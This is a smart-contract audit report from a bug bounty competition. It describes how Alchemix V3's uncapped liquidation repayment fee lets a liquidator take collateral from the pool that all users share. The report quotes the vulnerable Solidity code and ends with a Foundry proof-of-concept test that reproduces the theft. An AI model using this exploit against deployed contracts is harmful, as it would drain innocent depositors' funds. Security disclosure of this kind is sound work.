# 56740 sc critical unbounded liquidation fee allows theft of shared collateral

**Submitted on Oct 20th 2025 at 10:11:14 UTC by @godwinudo for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #56740
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The `_liquidate()` function contains an issue in its repayment fee logic that allows liquidators to receive more MYT tokens than the liquidated account actually possessed. When a position with fully earmarked debt is liquidated and the account has insufficient collateral remaining after force repayment, the system transfers an uncapped repayment fee to the liquidator. This fee is sourced from the shared collateral pool, effectively stealing MYT tokens from other innocent users' deposits. This occurs during normal protocol operations when transmuter positions mature after their standard 61-day term.

## Vulnerability Details

To understand why this issue exists, we must first examine how the Transmuter creates the vulnerable state.

The Alchemix Transmuter is a core protocol feature that allows users to redeem alAssets 1:1 for underlying assets after a fixed waiting period. This is the protocol's primary mechanism for fixed-rate yield and peg maintenance.

When a user deposits alAssets into the Transmuter, they create a redemption position with a standard maturation period:

```solidity
function createRedemption(uint256 syntheticDepositAmount) external {
    if (syntheticDepositAmount == 0) {
        revert DepositZeroAmount();
    }

    // User deposits alAssets to transmuter
    TokenUtils.safeTransferFrom(syntheticToken, msg.sender, address(this), syntheticDepositAmount);

    // Position created with maturation time
    _positions[++_nonce] = StakingPosition(
        syntheticDepositAmount, 
        block.number, 
        block.number + timeToTransmute  // ← Standard term: 5,256,000 blocks (~61 days)
    );

    // Update staking graph for linear earmarking
    _updateStakingGraph(
        syntheticDepositAmount.toInt256() * BLOCK_SCALING_FACTOR / timeToTransmute.toInt256(), 
        timeToTransmute
    );

    totalLocked += syntheticDepositAmount;
    _mint(msg.sender, _nonce);

    emit PositionCreated(msg.sender, syntheticDepositAmount, _nonce);
}
```

`timeToTransmute = 5,256,000 blocks`, equals approximately 61 days at 12 seconds per block. This is the standard redemption term set by the protocol for all transmuter positions.

As transmuter positions progress toward maturity, the Alchemist protocol linearly earmarks the corresponding borrower debt. This earmarking is handled automatically in the `_earmark()` function, which is called at the start of every liquidation:

```solidity
function _earmark() internal {
    if (totalDebt == 0) return;
    if (block.number <= lastEarmarkBlock) return;

    // Query transmuter to see how much debt should be earmarked based on blocks elapsed
    uint256 transmuterCurrentBalance = TokenUtils.safeBalanceOf(myt, address(transmuter));
    uint256 transmuterDifference = transmuterCurrentBalance > lastTransmuterTokenBalance 
        ? transmuterCurrentBalance - lastTransmuterTokenBalance 
        : 0;

    uint256 amount = ITransmuter(transmuter).queryGraph(lastEarmarkBlock + 1, block.number);

    // Adjust for any cover from transmuter balance
    uint256 coverInDebt = convertYieldTokensToDebt(transmuterDifference);
    amount = amount > coverInDebt ? amount - coverInDebt : 0;

    lastTransmuterTokenBalance = transmuterCurrentBalance;

    uint256 liveUnearmarked = totalDebt - cumulativeEarmarked;
    if (amount > liveUnearmarked) amount = liveUnearmarked;

    if (amount > 0 && liveUnearmarked != 0) {
        // Update survival tracking and weight increments
        uint256 previousSurvival = PositionDecay.SurvivalFromWeight(_earmarkWeight);
        if (previousSurvival == 0) previousSurvival = ONE_Q128;

        uint256 earmarkedFraction = _divQ128(amount, liveUnearmarked);

        _survivalAccumulator += _mulQ128(previousSurvival, earmarkedFraction);
        _earmarkWeight += PositionDecay.WeightIncrement(amount, liveUnearmarked);

        cumulativeEarmarked += amount;
    }

    lastEarmarkBlock = block.number;
}
```

The `queryGraph()` function in the Transmuter returns how much debt should be earmarked based on the linear progression of all transmuter positions:

```solidity
function queryGraph(uint256 startBlock, uint256 endBlock) external view returns (uint256) {
    if (endBlock <= startBlock) return 0;

    int256 queried = _stakingGraph.queryStake(startBlock, endBlock);
    if (queried == 0) return 0;

    return (queried / BLOCK_SCALING_FACTOR).toUint256()
        + (queried % BLOCK_SCALING_FACTOR == 0 ? 0 : 1);
}
```

For a transmuter position with amount `D` and term `T` blocks, the earmarking rate is linear:

* Earmark rate per block = `D / T`
* After `T` blocks elapsed: Total earmarked = `(D / T) × T = D`

For a realistic example with 180,000 alUSD debt:

* Transmutation term: 5,256,000 blocks (standard 61 days)
* Earmark per block: 180,000 / 5,256,000 ≈ 0.0342 alUSD
* After 5,256,000 blocks: 0.0342 × 5,256,000 = 180,000 alUSD (100% earmarked)

The issue arises during full earmarking, when `_resolveRepaymentFee()` returns an uncapped fee amount while only capping the deduction from the account's collateral balance.

When a position becomes liquidatable and has full earmarked debt, the `_liquidate()` function attempts to force repay that debt first:

```solidity
function _liquidate(uint256 accountId) internal returns (uint256 amountLiquidated, uint256 feeInYield, uint256 feeInUnderlying) {
    _earmark();
    _sync(accountId);

    Account storage account = _accounts[accountId];

    if (account.debt == 0) {
        return (0, 0, 0);
    }

    if (IVaultV2(myt).convertToAssets(1e18) == 0) {
        return (0, 0, 0);
    }

    uint256 collateralInUnderlying = totalValue(accountId);
    uint256 collateralizationRatio = collateralInUnderlying * FIXED_POINT_SCALAR / account.debt;

    if (collateralizationRatio > collateralizationLowerBound) {
        return (0, 0, 0);
    }

    // Try to repay earmarked debt if it exists
    uint256 repaidAmountInYield = 0;
    if (account.earmarked > 0) {
        repaidAmountInYield = _forceRepay(accountId, account.earmarked);
    }
    
    // If debt is fully cleared, return with only the repaid amount, no liquidation needed, caller receives repayment fee
    if (account.debt == 0) {
        feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
        TokenUtils.safeTransfer(myt, msg.sender, feeInYield);  // ← VULNERABLE: Transfers uncapped fee
        return (repaidAmountInYield, feeInYield, 0);
    }

    // ... rest of liquidation logic
}
```

The critical path is when `account.debt == 0` after the force repayment. At this point, the function calculates a repayment fee and transfers it to the liquidator.

The `_forceRepay()` function transfers the repaid amount to the transmuter and attempts to collect a protocol fee:

```solidity
function _forceRepay(uint256 accountId, uint256 amount) internal returns (uint256) {
    if (amount == 0) {
        return 0;
    }
    _checkForValidAccountId(accountId);
    Account storage account = _accounts[accountId];

    _earmark();
    _sync(accountId);

    uint256 debt;
    _checkState((debt = account.debt) > 0);

    uint256 credit = amount > debt ? debt : amount;
    uint256 creditToYield = convertDebtTokensToYield(credit);
    _subDebt(accountId, credit);

    // Repay debt from earmarked amount of debt first
    uint256 earmarkToRemove = credit > account.earmarked ? account.earmarked : credit;
    account.earmarked -= earmarkToRemove;

    creditToYield = creditToYield > account.collateralBalance ? account.collateralBalance : creditToYield;
    account.collateralBalance -= creditToYield;

    uint256 protocolFeeTotal = creditToYield * protocolFee / BPS;

    emit ForceRepay(accountId, amount, creditToYield, protocolFeeTotal);

    // This is where the problem starts - protocol fee is NOT collected if insufficient balance
    if (account.collateralBalance > protocolFeeTotal) {
        account.collateralBalance -= protocolFeeTotal;
        TokenUtils.safeTransfer(myt, protocolFeeReceiver, protocolFeeTotal);
    }

    if (creditToYield > 0) {
        TokenUtils.safeTransfer(myt, address(transmuter), creditToYield);
    }
    return creditToYield;
}
```

Notice that when `account.collateralBalance <= protocolFeeTotal`, the protocol fee is not deducted or transferred. This leaves the account with a minimal or zero collateral balance.

This is where the main issue exists.`_resolveRepaymentFee()` returns an uncapped fee

```solidity
function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
    Account storage account = _accounts[accountId];
    
    // calculate repayment fee and deduct from account
    fee = repaidAmountInYield * repaymentFee / BPS;
    
    // @audit_Issue Only caps the DEDUCTION from the account, not the RETURN value
    account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
    
    emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
    
    return fee;  // ← Returns the FULL calculated fee, not the capped amount
}
```

The function calculates `fee = repaidAmountInYield * repaymentFee / BPS`. For example, with a 10% repayment fee and 190K MYT repaid, the fee is 19K MYT.

The line `account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee` deducts the MINIMUM of (fee, account.collateralBalance) from the account. If the account has 0 balance remaining, it deducts 0.

However, the function returns `fee` - the full uncapped 19K MYT, not the amount actually deducted from the account.

Back in `_liquidate()`, the uncapped fee is transferred

```solidity
if (account.debt == 0) {
    feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
    TokenUtils.safeTransfer(myt, msg.sender, feeInYield);  // ← Transfers the full 19K MYT
    return (repaidAmountInYield, feeInYield, 0);
}
```

The `TokenUtils.safeTransfer(myt, msg.sender, feeInYield)` call transfers the full uncapped fee amount from the Alchemist contract's balance. Since the contract holds a shared pool of all users' collateral, this transfer effectively steals MYT from innocent users who have nothing to do with the liquidated position.

## Impact Details

Liquidators can receive more MYT than the liquidated account actually owns, and the excess is automatically taken from the collective collateral pool, draining funds from innocent users. Every user who deposits collateral into the Alchemist contract is at risk. The stolen funds come from the shared collateral pool.

## Proof of Concept

## Proof of Concept

Add this to the AlchemistV3.t.sol test

```solidity
function testLiquidationRepaymentFeeTheft() public {
    vm.startPrank(someWhale);
    IMockYieldToken(mockStrategyYieldToken).mint(whaleSupply, someWhale);
    vm.stopPrank();
    
    vm.startPrank(alOwner);
    alchemist.setProtocolFee(500);
    alchemist.setRepaymentFee(1000);
    vm.stopPrank();
    
    // Innocent user deposits
    vm.startPrank(yetAnotherExternalUser);
    SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount);
    alchemist.deposit(depositAmount, yetAnotherExternalUser, 0);
    vm.stopPrank();
    
    // Victim at max LTV
    vm.startPrank(address(0xbeef));
    SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount + 100e18);
    alchemist.deposit(depositAmount, address(0xbeef), 0);
    uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
    uint256 maxDebt = alchemist.totalValue(tokenId) * FIXED_POINT_SCALAR / minimumCollateralization;
    alchemist.mint(tokenId, maxDebt, address(0xbeef));
    IERC20(address(alToken)).approve(address(transmuterLogic), maxDebt);
    transmuterLogic.createRedemption(maxDebt);
    vm.stopPrank();
    
    vm.roll(block.number + 5_256_000);
    alchemist.poke(tokenId);
    
    uint256 initialSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
    IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialSupply);
    uint256 modifiedSupply = (initialSupply * 590 / 10_000) + initialSupply;
    IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedSupply);
    
    (uint256 colBefore,,) = alchemist.getCDP(tokenId);
    uint256 contractBalBefore = IERC20(address(vault)).balanceOf(address(alchemist));
    
    vm.prank(externalUser);
    (, uint256 feeReceived,) = alchemist.liquidate(tokenId);
    
    uint256 contractBalAfter = IERC20(address(vault)).balanceOf(address(alchemist));
    
    // Victim lost 200K, but system transferred 209.68K total
    uint256 stolen = (contractBalBefore - contractBalAfter) - colBefore;
    
    assertGt(stolen, 0, "Theft detected");
    assertEq(feeReceived, 19062000000000000020167, "Fee matches");
}
```
